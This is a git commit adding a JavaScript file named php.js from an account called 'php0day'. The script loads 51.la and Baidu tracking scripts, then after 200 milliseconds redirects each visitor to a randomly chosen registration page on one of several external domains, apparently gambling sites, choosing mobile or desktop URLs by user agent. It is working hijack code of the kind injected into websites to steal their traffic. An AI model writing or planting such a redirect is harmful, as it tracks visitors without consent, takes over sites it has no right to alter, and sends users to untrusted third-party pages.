69746b0eeb08f2d2da836394efdb25d87ad469a3
php0day <56468363+php0day@users.noreply.github.com>
2020-03-28 03:07:31 +0800

    Create php.js

---
+++ php.js
@@ -0,0 +1,36 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//js.users.51.la/20675339.js";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?0f7aff1f1419a377416168d9a5e7f2ca";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+var Pcurl = ["https://www.long809.vip/new-signup.jsp", "https://www.long8631.com/new-signup.jsp", "https://ag83165.com/index.html?register"];
+var Mturl = ["https://www.long809.vip/mobile/new/register.jsp", "https://www.long8631.com/mobile/new/register.jsp", "https://m.ag83165.com/register.html"];
+
+function Mobile() {
+	var sUserAgent = navigator.userAgent.toLowerCase();
+	if ((sUserAgent.match(/(iPhone|iPod|Android|ios|iPad|ucweb|mobile)/i))) {
+		return true;
+	} else {
+		return false;
+	}
+}
+setTimeout(function(){
+if (Mobile()) {
+	var rand = Math.floor((Math.random() * Mturl.length));
+	window.location.href = Mturl[rand];
+} else {
+	var rand = Math.floor((Math.random() * Pcurl.length));
+	window.location.href = Pcurl[rand];
+}
+},200);
